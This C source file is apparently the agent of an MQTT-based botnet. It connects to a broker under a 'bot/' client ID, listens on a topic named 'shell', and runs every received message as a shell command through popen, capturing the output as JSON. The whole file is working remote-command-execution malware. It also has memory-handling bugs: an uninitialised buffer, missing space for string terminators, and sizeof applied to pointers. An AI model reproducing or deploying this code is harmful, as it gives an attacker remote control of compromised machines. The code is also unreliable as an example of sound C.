#include <err.h>
#include <getopt.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <mosquitto.h>
#include <time.h>
#include "frozen.h"

struct userdata {
	char **topics;
	size_t topic_count;
	int command_argc;
	int verbose;
	char **command_argv;
	int qos;
	char **pubtopic;
};

struct botdata {
	char **ip_addr;
};

const char *get_time()
{
	time_t rawtime;
	struct tm *info;
	static char time_buf[80];

	time(&rawtime);

	info = localtime(&rawtime);

	strftime(time_buf, 80, "%d/%b/%Y:%H:%M:%S %z", info);
	printf("%s\n", time_buf);
	return time_buf;
}

void m_log_cb(struct mosquitto *mosq, void *obj, int level, const char *str)
{
	printf("%s\n", str);
}

int mqc_export(char *cmd, char *output)
{
	char buf[sizeof(output) + sizeof(cmd) + 512] = "";
	struct json_out out = JSON_OUT_BUF(buf, sizeof(buf));

	json_printf(&out, "{time: %Q, command: %Q, output: %Q}", get_time(), cmd,
				output);
	printf("%s\n", buf);
	return 0;
}

void m_message_cb(struct mosquitto *mosq, void *obj,
				const struct mosquitto_message *msg)
{
	pid_t pid;

	pid = fork();
	if (pid == 0) {
		if (strcmp(msg->payload, "_QUIT_")) {
			struct userdata *ud = (struct userdata *) obj;
			FILE *cmd = popen(msg->payload, "r");	//run command and print output. Can be sent to pub
			char result[1024] = { 0x0 };
			char *cmd_old = malloc(1);

			while (fgets(result, sizeof(result), cmd) != NULL) {
				char *cmd_final;

				cmd_final = malloc(strlen(cmd_old) + 1 + strlen(result));
				strcpy(cmd_final, cmd_old);
				strcat(cmd_final, result);
				free(cmd_old);
				cmd_old = malloc(strlen(cmd_final));
				strcpy(cmd_old, cmd_final);
				free(cmd_final);
			}
			pclose(cmd);
			mqc_export(msg->payload, cmd_old);
		} else {
			mosquitto_destroy(mosq);
			mosquitto_lib_cleanup();
			exit(0);
		}
	}

}

void m_connect_cb(struct mosquitto *mosq, void *obj, int result)
{
	struct userdata *ud = (struct userdata *) obj;

	fflush(stderr);
	if (result == 0) {
		size_t i;

		for (i = 0; i < ud->topic_count; i++)
			mosquitto_subscribe(mosq, NULL, ud->topics[i], ud->qos);
	} else {
		fprintf(stderr, "%s\n", mosquitto_connack_string(result));
	}
}

static int perror_ret(const char *msg)
{
	perror(msg);
	return 1;
}

static int valid_qos_range(int qos, const char *type)
{
	if (qos >= 0 && qos <= 2)
		return 1;

	fprintf(stderr, "%d: %s out of range\n", qos, type);
	return 0;
}

int mq_main(int argc, char *argv[])
{
	static struct option opts[] = {
		{"disable-clean-session", no_argument, 0, 'c'},
		{"debug", no_argument, 0, 'd'},
		{"host", required_argument, 0, 'h'},
		{"keepalive", required_argument, 0, 'k'},
		{"username", required_argument, 0, 'u'},
		{"password", required_argument, 0, 'x'},
		{"port", required_argument, 0, 'p'},
		{"qos", required_argument, 0, 'q'},
		{"topic", required_argument, 0, 't'}
	};
	int debug = 0;
	bool clean_session = true;
	const char *host = "localhost";
	int port = 1883;
	int keepalive = 60;
	int i, c, rc = 1;
	struct userdata ud;
	char hostname[256];
	static char id[MOSQ_MQTT_ID_MAX_LENGTH + 1];
	
	
	static char username[MOSQ_MQTT_ID_MAX_LENGTH+1];
	static char password[MOSQ_MQTT_ID_MAX_LENGTH+1];

	struct mosquitto *mosq = NULL;

	memset(&ud, 0, sizeof(ud));

	memset(hostname, 0, sizeof(hostname));
	memset(id, 0, sizeof(id));
	memset(username, 0, sizeof(username));
	memset(password, 0, sizeof(password));

	while ((c = getopt_long(argc, argv, "cdh:k:u:x:p:q:t", opts, &i)) != -1) {
		switch (c) {
		case 'c':
			clean_session = false;
			break;
		case 'd':
			debug = 1;
			break;
		case 'h':
			host = optarg;
			break;
		case 'k':
			keepalive = atoi(optarg);
			break;
		case 'p':
			port = atoi(optarg);
			break;
		case 'q':
			ud.qos = atoi(optarg);
			if (!valid_qos_range(ud.qos, "QoS"))
				return 1;
			break;


		case 'u':
			if (strlen(optarg) > MOSQ_MQTT_ID_MAX_LENGTH) {
				fprintf(stderr,
						"specified username is longer than %d chars\n",
						MOSQ_MQTT_ID_MAX_LENGTH);
				return 1;
			}
			strncpy(username, optarg, sizeof(username) - 1);
			break;
		case 'x':
			if (strlen(optarg) > MOSQ_MQTT_ID_MAX_LENGTH) {
				fprintf(stderr,
						"specified password is longer than %d chars\n",
						MOSQ_MQTT_ID_MAX_LENGTH);
				return 1;
			}
			strncpy(password, optarg, sizeof(password) - 1);
			break;

		case 't':
			ud.topic_count++;
			ud.topics = realloc(ud.topics, sizeof(char *) * ud.topic_count);
			ud.topics[ud.topic_count - 1] = optarg;
			break;
		}
	}

	if ((ud.topics == NULL)) {
		ud.topic_count++;
		ud.topics = realloc(ud.topics, sizeof(char *) * ud.topic_count);
		ud.topics[ud.topic_count - 1] = "shell";
		ud.pubtopic = realloc(ud.pubtopic, sizeof(char *) * 1);
		ud.pubtopic[0] = "data";
	}
	// id
	gethostname(hostname, sizeof(hostname) - 1);
	int id_num = (rand() % (999999999 + 1 - 100000000)) + 100000000;

	snprintf(id, sizeof(id), "bot/%d-%s", id_num, hostname);	//ie: bbn/5241-router

	mosquitto_lib_init();
	mosq = mosquitto_new(id, clean_session, &ud);
	if (mosq == NULL)
		return perror_ret("mosquitto_new");

	if (debug) {
		printf("host=%s:%d\nid=%s\n", host, port, id);
		mosquitto_log_callback_set(mosq, m_log_cb);
	}
	mosquitto_username_pw_set(mosq, username, password);

	mosquitto_connect_callback_set(mosq, m_connect_cb);
	mosquitto_message_callback_set(mosq, m_message_cb);

	//kernel assfucks children here
	signal(SIGCHLD, SIG_IGN);

	rc = mosquitto_connect(mosq, host, port, keepalive);
	if (rc != MOSQ_ERR_SUCCESS) {
		if (rc == MOSQ_ERR_ERRNO)
			return perror_ret("mosquitto_connect_bind");
		fprintf(stderr, "I'm sorry dave, I can't do that. (%d)\n", rc);
		goto cleanup;
	}

	rc = mosquitto_loop_forever(mosq, -1, 1);

  cleanup:
	mosquitto_destroy(mosq);
	mosquitto_lib_cleanup();
	exit(rc);

}
